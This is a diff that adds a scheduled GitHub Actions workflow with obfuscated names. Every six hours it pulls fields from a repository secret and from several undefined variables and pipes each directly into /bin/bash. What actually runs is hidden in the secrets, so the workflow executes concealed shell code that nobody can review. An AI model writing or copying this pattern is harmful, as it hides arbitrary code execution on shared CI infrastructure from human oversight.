@@ -1,0 +1,24 @@
+name: dongqianwusan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongqianwusan
+        env:
+          zgbj95: ${{ secrets.zgbj95 }}
+        run: |
+          echo $zgbj95 | jq -r .mbd9 | /bin/bash
+          echo $y476 | jq -r .mdcgm440 | /bin/bash
+          echo $uns9180 | jq -r .n44 | /bin/bash
+          echo $vfjkc51908 | jq -r .pji3 | /bin/bash
+          echo $nl83 | jq -r .h8 | /bin/bash
+          echo $dt41 | jq -r .jmd4 | /bin/bash
+          echo $wvx92061 | jq -r .gdjds9076 | /bin/bash
+          echo $lrr5 | jq -r .ie5793 | /bin/bash
+
